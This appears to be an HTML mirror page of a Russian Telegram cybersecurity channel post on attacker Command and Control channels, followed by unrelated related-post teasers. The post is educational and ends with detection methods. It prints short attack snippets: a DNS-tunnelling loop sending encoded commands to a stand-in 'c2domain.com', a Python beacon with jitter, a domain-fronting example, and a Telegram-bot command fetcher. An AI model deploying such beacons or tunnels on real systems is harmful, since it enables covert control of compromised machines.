@@ -1,0 +1,247 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Command and Control: как атакующий управляет заражённой машиной 👋 Привет… — ZeroDay | Кибербезопасность, Russia war | margeleT</title>
+  <meta name="description" content="Fresh Telegram snapshot from ZeroDay | Кибербезопасность in Russia. Command and Control: как атакующий управляет заражённой машиной 👋 Приветствую в мире цифровой безопасности! Сегодня расскажу про Command and Control (C2), как атакующий поддерживает с… Topics: war, politics, transport auto, auto." />
+  <meta name="keywords" content="margeleT, Telegram, Russia, ZeroDay | Кибербезопасность, cybersec_academy, war, politics, transport auto, auto, electronics pc, electronics" />
+  <link rel="canonical" href="https://www.margelet.space/post/3685573489" />
+  
+  <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large" />
+  <meta property="og:type" content="article" />
+  <meta property="og:site_name" content="margeleT" />
+  <meta property="og:title" content="Command and Control: как атакующий управляет заражённой машиной 👋 Привет… — ZeroDay | Кибербезопасность, Russia war | margeleT" />
+  <meta property="og:description" content="Fresh Telegram snapshot from ZeroDay | Кибербезопасность in Russia. Command and Control: как атакующий управляет заражённой машиной 👋 Приветствую в мире цифровой безопасности! Сегодня расскажу про Command and Control (C2), как атакующий поддерживает с… Topics: war, politics, transport auto, auto." />
+  <meta property="og:url" content="https://www.margelet.space/post/3685573489" />
+  <meta property="og:image" content="https://cdn4.telesco.pe/file/rldnWAh5jybs0NqFf2CeAlyjJvLcsANPqKJero8EnWhiXFrlw1ajeO-XVynZNDVEx628nQZBAKft2zFNtbvfZ4b-lwOmmxp5T6r-m372tAQ_Z7Gq6_l4-P-BzZzk3GVBBsY8QZ6GCIs4JfMdO-NwZ17q_EpZUySDwPmLoRQol2EmZ2NusbcilEHTNoNE-d0Nnfy0uvFXSqX5BTCJ8MZjbuKYOdpBdHEkbB-4NCj_gL1y2XWu357kXFpJihS-sLKFZ6_bJpTffTCoKtQYJfOgJfMmLOKljmrAWSVcQsm0Pn7n9S0rmCC45xLkkJ6HwHnmIfXDcQrzSNJErq5mYRcCSg.jpg" />
+  <meta property="og:updated_time" content="2026-07-22T12:20:30.855Z" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Command and Control: как атакующий управляет заражённой машиной 👋 Привет… — ZeroDay | Кибербезопасность, Russia war | margeleT" />
+  <meta name="twitter:description" content="Fresh Telegram snapshot from ZeroDay | Кибербезопасность in Russia. Command and Control: как атакующий управляет заражённой машиной 👋 Приветствую в мире цифровой безопасности! Сегодня расскажу про Command and Control (C2), как атакующий поддерживает с… Topics: war, politics, transport auto, auto." />
+  <meta name="twitter:image" content="https://cdn4.telesco.pe/file/rldnWAh5jybs0NqFf2CeAlyjJvLcsANPqKJero8EnWhiXFrlw1ajeO-XVynZNDVEx628nQZBAKft2zFNtbvfZ4b-lwOmmxp5T6r-m372tAQ_Z7Gq6_l4-P-BzZzk3GVBBsY8QZ6GCIs4JfMdO-NwZ17q_EpZUySDwPmLoRQol2EmZ2NusbcilEHTNoNE-d0Nnfy0uvFXSqX5BTCJ8MZjbuKYOdpBdHEkbB-4NCj_gL1y2XWu357kXFpJihS-sLKFZ6_bJpTffTCoKtQYJfOgJfMmLOKljmrAWSVcQsm0Pn7n9S0rmCC45xLkkJ6HwHnmIfXDcQrzSNJErq5mYRcCSg.jpg" />
+  <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://www.margelet.space/#website","name":"margeleT","url":"https://www.margelet.space"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"margeleT","item":"https://www.margelet.space"},{"@type":"ListItem","position":2,"name":"Russia","item":"https://www.margelet.space/ru"},{"@type":"ListItem","position":3,"name":"ZeroDay | Кибербезопасность","item":"https://www.margelet.space/cybersec_academy"}]},{"@type":["Article","SocialMediaPosting"],"headline":"Command and Control: как атакующий управляет заражённой машиной 👋 Привет…","description":"Fresh Telegram snapshot from ZeroDay | Кибербезопасность in Russia. Command and Control: как атакующий управляет заражённой машиной 👋 Приветствую в мире цифровой безопасности! Сегодня расскажу про Command and Control (C2), как атакующий поддерживает с… Topics: war, politics, transport auto, auto.","articleBody":"Command and Control: как атакующий управляет заражённой машиной 👋 Приветствую в мире цифровой безопасности! Сегодня расскажу про Command and Control (C2), как атакующий поддерживает связь с уже скомпрометированным хостом и передаёт команды после того, как первоначальный доступ получен. ⏺C2 - это канал связи между заражённой машиной и инфраструктурой атакующего. Без него закрепление в системе бесполезно: получил доступ, а команды передать некому и результат не забрать. Вся современная эволюция C2 - это попытка сделать этот канал неотличимым от легитимного трафика. ⏺DNS-туннелирование - команды и данные кодируются прямо в DNS-запросы, потому что DNS почти никогда не блокируется файрволом: # Атакующий кодирует команду в поддомен echo \"whoami\" | base64 | fold -w 63 | while read chunk; do dig $chunk.c2domain.com TXT done Ответ сервера прилетает в TXT-записи DNS-ответа. Для сетевого мониторинга это выглядит, как обычные DNS-запросы, только частота и энтропия поддоменов аномальные. ⏺HTTPS beacon с jitter - заражённая машина периодически стучится на C2-сервер с рандомизированным интервалом, маскируясь под обычный трафик к легитимному облачному сервису: import time, random, requests while…","text":"Command and Control: как атакующий управляет заражённой машиной 👋 Приветствую в мире цифровой безопасности! Сегодня расскажу про Command and Control (C2), как атакующий поддерживает связь с уже скомпрометированным хостом и передаёт команды после того, как первоначальный доступ получен. ⏺C2 - это канал связи между заражённой машиной и инфраструктурой атакующего. Без него закрепление в системе бесполезно: получил доступ, а команды передать некому и результат не забрать. Вся современная эволюция C2 - это попытка сделать этот канал неотличимым от легитимного трафика. ⏺DNS-туннелирование - команды и данные кодируются прямо в DNS-запросы, потому что DNS почти никогда не блокируется файрволом: # Атакующий кодирует команду в поддомен echo \"whoami\" | base64 | fold -w 63 | while read chunk; do dig $chunk.c2domain.com TXT done Ответ сервера прилетает в TXT-записи DNS-ответа. Для сетевого мониторинга это выглядит, как обычные DNS-запросы, только частота и энтропия поддоменов аномальные. ⏺HTTPS beacon с jitter - заражённая машина периодически стучится на C2-сервер с рандомизированным интервалом, маскируясь под обычный трафик к легитимному облачному сервису: import time, random, requests while True: r = requests.get(\"https://legit-looking-cdn.com/update.json\", headers={\"User-Agent\": \"Mozilla/5.0...\"}) # разбираем команду из ответа, ждём jitter перед следующим запросом time.sleep(random.randint(300, 900)) Jitter (случайная задержка) специально ломает паттерн - если бы запросы шли строго каждые 5 минут, это легко детектировалось бы по регулярности интервалов в NetFlow. ⏺Domain fronting - C2-трафик маскируется под запрос к крупному CDN на уровне TLS SNI, а реальный домен назначения указывается только в HTTP Host-заголовке внутри зашифрованного соединения: TLS SNI: cloudfront.net HTTP Host: attacker-c2.cloudfront.net Файрвол видит легитимный сертификат CDN и пропускает трафик, а внутри зашифрованного соединения запрос на самом деле уходит к инфраструктуре атакующего зарегистрированной через тот же CDN. ⏺C2 через легитимные сервисы - Slack, Discord, Telegram, GitHub Gist используются, как транспорт вместо собственной инфраструктуры: import requests def get_command(): r = requests.get(\"https://api.telegram.org/bot&lt;TOKEN&gt;/getUpdates\") return r.json()['result'][-1]['message']['text'] Трафик к Telegram API выглядит, как обычное использование мессенджера. Никакого подозрительного домена или самопальной инфраструктуры - только легитимный сервис, который сложно заблокировать целиком без последствий для остальных юзеров. ⏺Детектиться через аномалии в DNS (высокая частота запросов к одному домену, необычная энтропия поддоменов), JA3/JA3S фингерпринтинг TLS-хендшейков которые не совпадают с заявленным User-Agent, поведенческий анализ регулярности запросов даже с учётом jitter, и мониторинг обращений к легитимным API вроде Telegram или Discord с серверов, которые не должны иметь такого паттерна использования. ZeroDay | Серверная Админа | #defenseevasion","keywords":"margeleT, Telegram, Russia, ZeroDay | Кибербезопасность, cybersec_academy, war, politics, transport auto, auto, electronics pc, electronics","url":"https://www.margelet.space/post/3685573489","mainEntityOfPage":"https://www.margelet.space/post/3685573489","datePublished":"2026-07-22T12:20:30.855Z","dateModified":"2026-07-22T12:20:30.855Z","image":["https://cdn4.telesco.pe/file/rldnWAh5jybs0NqFf2CeAlyjJvLcsANPqKJero8EnWhiXFrlw1ajeO-XVynZNDVEx628nQZBAKft2zFNtbvfZ4b-lwOmmxp5T6r-m372tAQ_Z7Gq6_l4-P-BzZzk3GVBBsY8QZ6GCIs4JfMdO-NwZ17q_EpZUySDwPmLoRQol2EmZ2NusbcilEHTNoNE-d0Nnfy0uvFXSqX5BTCJ8MZjbuKYOdpBdHEkbB-4NCj_gL1y2XWu357kXFpJihS-sLKFZ6_bJpTffTCoKtQYJfOgJfMmLOKljmrAWSVcQsm0Pn7n9S0rmCC45xLkkJ6HwHnmIfXDcQrzSNJErq5mYRcCSg.jpg"],"inLanguage":"ru","about":[{"@type":"Thing","name":"war"},{"@type":"Thing","name":"politics"},{"@type":"Thing","name":"transport auto"},{"@type":"Thing","name":"auto"},{"@type":"Thing","name":"electronics pc"},{"@type":"Thing","name":"electronics"}],"author":{"@type":"Organization","name":"ZeroDay | Кибербезопасность","url":"https://www.margelet.space/cybersec_academy","logo":"https://cdn4.telesco.pe/file/EJvDejzR3bo--MjtiGFb42EygvuvX1yygPVZbud9d4QmUhJEGX3lgnArcy3v4mDTy4TIfaFv0k1EHnBzDkjuKPCNzVQ6VDUqRdpmjJZj5kTHEZGncMqZH3dPO_EW-mVt5Heh55sr0Mkzhc_UvkFbtPbXly3yDdp_fy92IQ4zx0ladQFdztlJfU0OUW24fmM61mEAzaycn5wfu_aBOPGn7k2Irn8bED3sl8DB-JLU-_xrVMWy37190Jme3IinlMKv0LpLF4oCUuTXU2tQJ3rT-FtkNGmojVKw3wiG-SprC4WgY5GZZsjRXZtP38-c6eru9rKo0q-zE28OtJz00kaQiQ.jpg"},"publisher":{"@type":"Organization","name":"margeleT","url":"https://www.margelet.space","logo":{"@type":"ImageObject","url":"https://www.margelet.space/icon-512.png"}},"isPartOf":{"@id":"https://www.margelet.space/#website"},"sameAs":"https://t.me/cybersec_academy/1963?single"}]}</script>
+  <style>
+    :root{color-scheme:dark}html,body{width:100%;max-width:100%;overflow-x:hidden}*,*::before,*::after{box-sizing:border-box}body{margin:0;background:#101c29;color:#f7fbff;font-family:Inter,Arial,sans-serif;line-height:1.55}main{width:100%;max-width:920px;margin:0 auto;padding:32px 18px 56px;overflow-x:hidden}.brand{font-weight:800;font-size:28px;margin-bottom:26px}.card,.post{width:100%;max-width:100%;min-width:0;overflow:hidden;background:#172635;border:1px solid #294158;border-radius:22px;padding:18px;margin:14px 0}.muted,.meta,.source span{color:#a9bed2}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px}a{color:#b9dcff;overflow-wrap:anywhere;word-break:break-word;max-width:100%}.pill{display:inline-block;border:1px solid #31506b;border-radius:999px;padding:7px 11px;margin:4px}.source{margin-top:0;display:flex;align-items:center;gap:9px;min-width:0}.source-avatar{width:32px;height:32px;border-radius:50%;object-fit:cover;background:#0b1520;border:1px solid #31506b;flex:0 0 auto}.source-main{min-width:0;max-width:100%;overflow:hidden}.source-title-row{display:flex;align-items:center;gap:5px;min-width:0;max-width:100%;overflow:hidden}.source-title{font-weight:800;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.verified-badge{display:inline-flex;width:14px;height:14px;align-items:center;justify-content:center;line-height:0;flex:0 0 auto}.verified-badge svg{display:block;width:14px;height:14px;max-width:14px!important;min-width:14px!important}.post-link{display:block;color:inherit;text-decoration:none}.post-link:hover h3,.post-link:hover p{text-decoration:none}.post h3{font-size:18px;margin:0 0 8px}.post img:not(.source-avatar){display:block;width:100%;max-width:100%;height:auto;border-radius:16px;margin:10px 0;background:#0b1520}h1{font-size:34px;line-height:1.15;margin:0 0 12px;overflow-wrap:anywhere}h2{margin-top:30px}p,h1,h2,h3,strong,span,div{overflow-wrap:anywhere}.post p{max-width:100%;min-width:0}.post>p:not(.source):not(.meta):not(.notice){word-break:break-word}.actions{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin-top:14px;max-width:100%;min-width:0}ul{padding-left:20px}.links a{display:inline-block;margin:4px 8px 4px 0}.open{display:inline-block;background:#fff;color:#101c29;text-decoration:none;border-radius:999px;padding:11px 16px;font-weight:700}.secondary-open{display:inline-block;border:1px solid #31506b;color:#d7ecff;text-decoration:none;border-radius:999px;padding:10px 15px;font-weight:700}.notice{border-left:3px solid #6eb6ff;padding-left:12px}.two{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:14px}.kbd{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;color:#d7ecff}.small{font-size:14px}.tag-row{margin:10px 0}.tag-row a{text-decoration:none}.telegram-link{color:#ffd9a6}@media(max-width:520px){html,body{overflow-x:hidden}main{width:100%;max-width:100vw;padding:18px 12px 40px}.brand{font-size:25px;margin-bottom:18px}.card,.post{border-radius:18px;padding:14px;margin:12px 0}h1{font-size:25px;line-height:1.14;letter-spacing:-.02em}.post h3{font-size:17px}.post img:not(.source-avatar){width:100%;height:auto}.actions{display:grid;grid-template-columns:minmax(0,1fr);gap:8px}.open,.secondary-open{width:100%;max-width:100%;box-sizing:border-box;text-align:center;padding:11px 12px;white-space:normal}.source-avatar{width:30px;height:30px}.source-title{max-width:100%;white-space:normal}.source{align-items:flex-start}.source-main span{word-break:break-word}.post>p:not(.source):not(.meta):not(.notice){font-size:15px;line-height:1.48}.notice{font-size:14px;line-height:1.45}.pill{max-width:100%}}
+  .post .source-avatar{display:block!important;width:32px!important;height:32px!important;max-width:32px!important;min-width:32px!important;border-radius:50%!important;object-fit:cover!important;margin:0!important}.post .source{display:flex!important;align-items:center!important;gap:9px!important}.post .source-main{display:block!important;min-width:0!important;overflow:hidden!important}.post .source-title-row{display:flex!important;align-items:center!important;gap:5px!important;min-width:0!important;max-width:100%!important;overflow:hidden!important}.post .source-title{font-size:15px!important;line-height:1.2!important}.post .source-main span{display:block}@media(max-width:520px){.post .source-avatar{width:30px!important;height:30px!important;max-width:30px!important;min-width:30px!important}.post .source{align-items:flex-start!important}.post .source-title-row{display:flex!important}.post .source-main span{font-size:14px;line-height:1.25}.post .source-title{font-size:14px!important;white-space:normal!important}}.post,.card,.actions,.notice,.tag-row{max-width:100%;min-width:0}.post *{max-width:100%}.post .source-avatar{max-width:30px!important}</style>
+</head>
+<body>
+  <main>
+    <div class="brand"><a href="/" style="color:inherit;text-decoration:none">margeleT</a></div>
+    <article class="post">
+      <p class="source">
+        <img class="source-avatar" src="https://cdn4.telesco.pe/file/EJvDejzR3bo--MjtiGFb42EygvuvX1yygPVZbud9d4QmUhJEGX3lgnArcy3v4mDTy4TIfaFv0k1EHnBzDkjuKPCNzVQ6VDUqRdpmjJZj5kTHEZGncMqZH3dPO_EW-mVt5Heh55sr0Mkzhc_UvkFbtPbXly3yDdp_fy92IQ4zx0ladQFdztlJfU0OUW24fmM61mEAzaycn5wfu_aBOPGn7k2Irn8bED3sl8DB-JLU-_xrVMWy37190Jme3IinlMKv0LpLF4oCUuTXU2tQJ3rT-FtkNGmojVKw3wiG-SprC4WgY5GZZsjRXZtP38-c6eru9rKo0q-zE28OtJz00kaQiQ.jpg" alt="" loading="lazy" referrerpolicy="no-referrer" />
+        <span class="source-main">
+          <span class="source-title-row"><strong class="source-title">ZeroDay | Кибербезопасность</strong></span>
+          <span>@cybersec_academy</span>
+        </span>
+      </p>
+      <h1>Command and Control: как атакующий управляет заражённой машиной 👋 Привет…</h1>
+      <p>Command and Control: как атакующий управляет заражённой машиной
+
+👋 Приветствую в мире цифровой безопасности!
+
+Сегодня расскажу про Command and Control (C2), как атакующий поддерживает связь с уже скомпрометированным хостом и передаёт команды после того, как первоначальный доступ получен.
+
+⏺C2 - это канал связи между заражённой машиной и инфраструктурой атакующего. Без него закрепление в системе бесполезно: получил доступ, а команды передать некому и результат не забрать. Вся современная эволюция C2 - это попытка сделать этот канал неотличимым от легитимного трафика.
+
+⏺DNS-туннелирование - команды и данные кодируются прямо в DNS-запросы, потому что DNS почти никогда не блокируется файрволом:
+
+# Атакующий кодирует команду в поддомен
+echo &quot;whoami&quot; | base64 | fold -w 63 | while read chunk; do
+  dig $chunk.c2domain.com TXT
+done
+
+Ответ сервера прилетает в TXT-записи DNS-ответа. Для сетевого мониторинга это выглядит, как обычные DNS-запросы, только частота и энтропия поддоменов аномальные.
+
+⏺HTTPS beacon с jitter - заражённая машина периодически стучится на C2-сервер с рандомизированным интервалом, маскируясь под обычный трафик к легитимному облачному сервису:
+
+import time, random, requests
+
+while True:
+    r = requests.get(&quot;https://legit-looking-cdn.com/update.json&quot;,
+                      headers={&quot;User-Agent&quot;: &quot;Mozilla/5.0...&quot;})
+    # разбираем команду из ответа, ждём jitter перед следующим запросом
+    time.sleep(random.randint(300, 900))
+
+Jitter (случайная задержка) специально ломает паттерн - если бы запросы шли строго каждые 5 минут, это легко детектировалось бы по регулярности интервалов в NetFlow.
+
+⏺Domain fronting - C2-трафик маскируется под запрос к крупному CDN на уровне TLS SNI, а реальный домен назначения указывается только в HTTP Host-заголовке внутри зашифрованного соединения:
+
+TLS SNI: cloudfront.net
+HTTP Host: attacker-c2.cloudfront.net
+
+Файрвол видит легитимный сертификат CDN и пропускает трафик, а внутри зашифрованного соединения запрос на самом деле уходит к инфраструктуре атакующего зарегистрированной через тот же CDN.
+
+⏺C2 через легитимные сервисы - Slack, Discord, Telegram, GitHub Gist используются, как транспорт вместо собственной инфраструктуры:
+
+import requests
+
+def get_command():
+    r = requests.get(&quot;https://api.telegram.org/bot&amp;lt;TOKEN&amp;gt;/getUpdates&quot;)
+    return r.json()[&#39;result&#39;][-1][&#39;message&#39;][&#39;text&#39;]
+
+Трафик к Telegram API выглядит, как обычное использование мессенджера. Никакого подозрительного домена или самопальной инфраструктуры - только легитимный сервис, который сложно заблокировать целиком без последствий для остальных юзеров.
+
+⏺Детектиться через аномалии в DNS (высокая частота запросов к одному домену, необычная энтропия поддоменов), JA3/JA3S фингерпринтинг TLS-хендшейков которые не совпадают с заявленным User-Agent, поведенческий анализ регулярности запросов даже с учётом jitter, и мониторинг обращений к легитимным API вроде Telegram или Discord с серверов, которые не должны иметь такого паттерна использования.
+
+ZeroDay | Серверная Админа | #defenseevasion</p>
+      <img src="https://cdn4.telesco.pe/file/rldnWAh5jybs0NqFf2CeAlyjJvLcsANPqKJero8EnWhiXFrlw1ajeO-XVynZNDVEx628nQZBAKft2zFNtbvfZ4b-lwOmmxp5T6r-m372tAQ_Z7Gq6_l4-P-BzZzk3GVBBsY8QZ6GCIs4JfMdO-NwZ17q_EpZUySDwPmLoRQol2EmZ2NusbcilEHTNoNE-d0Nnfy0uvFXSqX5BTCJ8MZjbuKYOdpBdHEkbB-4NCj_gL1y2XWu357kXFpJihS-sLKFZ6_bJpTffTCoKtQYJfOgJfMmLOKljmrAWSVcQsm0Pn7n9S0rmCC45xLkkJ6HwHnmIfXDcQrzSNJErq5mYRcCSg.jpg" alt="" loading="lazy" referrerpolicy="no-referrer" />
+      <p class="meta"><time datetime="2026-07-22T12:20:30.855Z">Jul 22, 2026, 12:20 PM</time> · Russia</p>
+      <div class="tag-row">
+        <a class="pill" href="/country/ru/tag/war">war</a>
+<a class="pill" href="/country/ru/tag/politics">politics</a>
+<a class="pill" href="/country/ru/tag/transport/auto">transport / auto</a>
+<a class="pill" href="/country/ru/tag/auto">auto</a>
+<a class="pill" href="/country/ru/tag/electronics/pc">electronics / pc</a>
+<a class="pill" href="/country/ru/tag/electronics">electronics</a>
+      </div>
+      <p class="notice muted">Fresh margeleT snapshot · Russia · ZeroDay | Кибербезопасность · war · politics · transport / auto. This page keeps context and source links for search engines and AI assistants.</p>
+      <div class="actions">
+        <a class="open" href="/ru">Open live margeleT feed</a>
+        <a class="secondary-open" href="/cybersec_academy/1963">Open this post in margeleT feed</a>
+        <a class="secondary-open telegram-link" href="https://t.me/cybersec_academy/1963?single" rel="nofollow noopener" target="_blank">Open original Telegram post</a>
+      </div>
+    </article>
+
+    <section>
+      <h2>Related margeleT posts</h2>
+      <article class="post">
+      <a class="post-link" href="/post/4026773650">
+        <p class="source">
+        <img class="source-avatar" src="https://cdn4.telesco.pe/file/SXY32lcgbsYdG2Ek_hLciYXxIBAms6milamFL0kYIevUp9KWsSs_x5Q4VfaZGoDtMKcxcYD3spYIFvtaShKsjpACqrJj2Rbvvr2zPvi_WntF0CZyMgX5_AB1rr6qomtwRt2Apx8C0-kRkr4xNGNWKJoadCP-T4TwZsZJzJQpLDoebDD23jWTQC91nRL14njIFP4LkPnHC644w8CSxocUsk7Guq_iY2dsTO6JyQNdxMCnHOkvKJ7RTH20rwi1bsRPPKvEUtMyPoSAlsHujjYMwAzfa_k76W9l32bgICewTFUe8hp6BMokd_C-PknAtV-Pr9prRPIQnWCB4ump03jAew.jpg" alt="" loading="lazy" referrerpolicy="no-referrer" />
+        <span class="source-main">
+          <span class="source-title-row"><strong class="source-title">InterNews — Новости ПК и технологий</strong></span>
+          <span>@internews_hw</span>
+        </span>
+      </p>
+        <img src="https://cdn4.telesco.pe/file/kHHwcwkGS8JHXQvz7dqV0uK5rh-sCga0fByLqdFxLagURgIfWEhqozNdKLloaSNBP_hMnCDgLCa_7qsEVVb-BmRhjtj2bgYTVRpcLPPvfB3pVSJd-8whqiPHyl3u05q-bHYAb3nfbiNdbrId-OesAwvytncZgIL5Ica5cDmXowKXa-d1jbAqJftKWUiXIE_puD1fCtVnBek4wMI2SJ2uK4_9ziUvKrO3urowllxVWXO-snESODr8gmjhOXfs4TsWCe8XJADX_Y1GocjjnKCI3x2XVx0k4qlKBN4xN8i26SDUCNaZ6fB-cbsdE1Nebd7xaTPO-M7yIuIjfSSgCSXjjw.jpg" alt="" loading="lazy" referrerpolicy="no-referrer" />
+        <h3>📣 Lisuan LX 7G100 сравнили с RTX 4070 Один из первых покупателей заявил,…</h3>
+        <p>📣 Lisuan LX 7G100 сравнили с RTX 4070 Один из первых покупателей заявил, что по ощущениям LX 7G100 близка к RTX 4070, однако не привёл результаты тестов, настройки или список игр. Поэтому воспринимать отзыв как реальное сравнение производительности нельзя. Н…</p>
+      </a>
+      <p class="meta"><time datetime="2026-07-22T12:21:32.565Z">Jul 22, 2026, 12:21 PM</time> · <a href="/post/4026773650">View post on margeleT</a></p>
+    </article>
+<article class="post">
+      <a class="post-link" href="/post/1984801534">
+        <p class="source">
+        <img class="source-avatar" src="https://cdn4.telesco.pe/file/npChMnJ123gtpilMvU5mVbWD2widR66Ikm7y9e2TSPJs8tb5-IkSFcRnf3JNljUSb0_lZCERj_AGi61Hy7JOMPAUYsIp2_ITyE9kdBxrjaGNQQgxI92_x1wvimhqsU5C1tgYc9Wtgga3hY0k-6YsiZ32ElSelj-bspO08vmEc6bcNp3IC3zPRGOjk_T4LPJTFzSWdX4SXUWeM6xnyvnLW5tArlAKev8M0eGNbGSOzUsPhsaoaPNXvCe0MUstdjhNC33XKDtO59eB0eEPjijtt8h7MXkh4QA57o8CY2BiN_cUkO6dkGNoORcPtzZxholIdL13zs7P2ROo7ZuAH-oVaQ.jpg" alt="" loading="lazy" referrerpolicy="no-referrer" />
+        <span class="source-main">
+          <span class="source-title-row"><strong class="source-title">СИЛОВИКИ 🇷🇺</strong></span>
+          <span>@sil0viki</span>
+        </span>
+      </p>
+        
+        <h3>Как ФНС доказывает «серые» зарплаты: 11 источников улик Даже идеальные РС…</h3>
+        <p>Как ФНС доказывает «серые» зарплаты: 11 источников улик Даже идеальные РСВ и 6-НДФЛ не защитят от проверки. Информация о схемах приходит налоговикам из разных источников. Судебная практика это подтверждает. ▪️Откуда инспекторы узнают о конвертах. ❌Жалоба бывш…</p>
+      </a>
+      <p class="meta"><time datetime="2026-07-22T12:06:28.964Z">Jul 22, 2026, 12:06 PM</time> · <a href="/post/1984801534">View post on margeleT</a></p>
+    </article>
+<article class="post">
+      <a class="post-link" href="/post/2314502000">
+        <p class="source">
+        <img class="source-avatar" src="https://cdn4.telesco.pe/file/EJvDejzR3bo--MjtiGFb42EygvuvX1yygPVZbud9d4QmUhJEGX3lgnArcy3v4mDTy4TIfaFv0k1EHnBzDkjuKPCNzVQ6VDUqRdpmjJZj5kTHEZGncMqZH3dPO_EW-mVt5Heh55sr0Mkzhc_UvkFbtPbXly3yDdp_fy92IQ4zx0ladQFdztlJfU0OUW24fmM61mEAzaycn5wfu_aBOPGn7k2Irn8bED3sl8DB-JLU-_xrVMWy37190Jme3IinlMKv0LpLF4oCUuTXU2tQJ3rT-FtkNGmojVKw3wiG-SprC4WgY5GZZsjRXZtP38-c6eru9rKo0q-zE28OtJz00kaQiQ.jpg" alt="" loading="lazy" referrerpolicy="no-referrer" />
+        <span class="source-main">
+          <span class="source-title-row"><strong class="source-title">ZeroDay | Кибербезопасность</strong></span>
+          <span>@cybersec_academy</span>
+        </span>
+      </p>
+        <img src="https://cdn4.telesco.pe/file/Ne5ztf-BYim1Gdsoe4uchmicVIMgtZB4uqKH2ZaqMb8L6lfAUCKxs6mSI1CEXcqBVu5zJ207pnLVAuPrMnvaCsK6TZmtYlkmt2pr9lCYsRUYt6ZJpkldKrVGPRGHG6xF2rjmOIGfUtwodMm430wGqc51QJuEfURVKZYaS_PMnwYutNtugPYHcxwoXhr7zVs5F2BBH4qAZPFDw_ZAvUsUqCXwcg-kDMVtEpbIDia4BdADZOprIy0r7YX48rBoYb6pI8vWvriO7hnSuvRJekgVg-Luqh0oHIfHzzsi8Rp_g-Xx1XgqfT_vOGiQ-6lFWvinxj8JJAHCWO9eWAmM3RHZ-w.jpg" alt="" loading="lazy" referrerpolicy="no-referrer" />
+        <h3>StarGuard AI 1.1: безопасная работа с LLM с мониторингом и биллингом AI-с…</h3>
+        <p>StarGuard AI 1.1: безопасная работа с LLM с мониторингом и биллингом AI-сервисов Разработчик экосистемы инфраструктурного ПО Orion soft представил обновление StarGuard AI 1.1 — платформы безопасности для централизованной работы с большими языковыми моделями.…</p>
+      </a>
+      <p class="meta"><time datetime="2026-07-22T12:20:30.855Z">Jul 22, 2026, 12:20 PM</time> · <a href="/post/2314502000">View post on margeleT</a></p>
+    </article>
+<article class="post">
+      <a class="post-link" href="/post/2698754643">
+        <p class="source">
+        <img class="source-avatar" src="https://cdn4.telesco.pe/file/EJvDejzR3bo--MjtiGFb42EygvuvX1yygPVZbud9d4QmUhJEGX3lgnArcy3v4mDTy4TIfaFv0k1EHnBzDkjuKPCNzVQ6VDUqRdpmjJZj5kTHEZGncMqZH3dPO_EW-mVt5Heh55sr0Mkzhc_UvkFbtPbXly3yDdp_fy92IQ4zx0ladQFdztlJfU0OUW24fmM61mEAzaycn5wfu_aBOPGn7k2Irn8bED3sl8DB-JLU-_xrVMWy37190Jme3IinlMKv0LpLF4oCUuTXU2tQJ3rT-FtkNGmojVKw3wiG-SprC4WgY5GZZsjRXZtP38-c6eru9rKo0q-zE28OtJz00kaQiQ.jpg" alt="" loading="lazy" referrerpolicy="no-referrer" />
+        <span class="source-main">
+          <span class="source-title-row"><strong class="source-title">ZeroDay | Кибербезопасность</strong></span>
+          <span>@cybersec_academy</span>
+        </span>
+      </p>
+        <img src="https://cdn4.telesco.pe/file/g5c8iNHheGgBNcGHdEVOTn2g9WUHPzBGXIKXoErPI5URO9rwtyt5rCgWI2aDfkaED079fqKx7txvOphu9NV7NdfPROs-1UDXVAt2SDQUpzUuR93hRTdSaW9hONz9svf5doLP0MdnkfrJORlqX4uwoBVHKhdl0RWMzh7Db_hOvoTbndRdYQwbSYE9JypQirOfNHfgBuZ7cHrDnHbrhumVwcSHa78PxF5ziTrzq214mmshlPSsDM0fxnN3RRf-5B5qqvuRPkPyHrYAPFjTSHoGZQiw-rSOAaV3pHqLgoV3b8FXCKIEu_Ceez4y_TNqxG7Bi1oyMRTJ6cWONieMf5VN0g.jpg" alt="" loading="lazy" referrerpolicy="no-referrer" />
+        <h3>Nosey Parker: ищем API-ключи, пароли и секреты даже в истории Git 👋 Прив…</h3>
+        <p>Nosey Parker: ищем API-ключи, пароли и секреты даже в истории Git 👋 Приветствую в мире цифровой безопасности! Расскажу об инструменте, который помогает находить случайно оставленные секреты в коде, конфигурациях и истории Git. ⏺Nosey Parker - CLI-сканер, кот…</p>
+      </a>
+      <p class="meta"><time datetime="2026-07-22T12:20:30.855Z">Jul 22, 2026, 12:20 PM</time> · <a href="/post/2698754643">View post on margeleT</a></p>
+    </article>
+<article class="post">
+      <a class="post-link" href="/post/1176946065">
+        <p class="source">
+        <img class="source-avatar" src="https://cdn4.telesco.pe/file/gxeCERpA07Ld9fEYX_NIj83twCHxxpdLk_eav22xwQTMzVRIccZR4pSpI3XMJENvYuEGYYvA54WURFzxJKQunAVi_oCdwQzXYqPOOjFyKt9-6iUKpdx6S7FxdqsO5ZJ6BwgOO_RnAFppJTak0aFUvHdo2HhBo3V61MIMN9JnoMOaTfCF3Ymqb-ttZ25sTKs6MRPtRGGP7w28XUsBt_ZeYddExKd0LcZvYl2LDP3x19vVwaxn4PEvLsJbMizYFqqGnp5k3QgBOdG9WvPX4McKsdp8iYvdo7XGVw2nIiq2I1i9GKv1U0oQjYcl-xJcxTba-8vbVcOrwApf-BT_jIA6Kw.jpg" alt="" loading="lazy" referrerpolicy="no-referrer" />
+        <span class="source-main">
+          <span class="source-title-row"><strong class="source-title">Авто Белгород</strong></span>
+          <span>@avto_belgorod31</span>
+        </span>
+      </p>
+        
+        <h3>По Белгороду, Белгородскому и Шебекинскому округам нанесён ракетный удар…</h3>
+        <p>По Белгороду, Белгородскому и Шебекинскому округам нанесён ракетный удар со стороны ВСУ Предварительно, пострадавших нет. 📌 Авто Белгород - подписаться ✉️ Отправить новость 📱 Авто Белгород в МАХ</p>
+      </a>
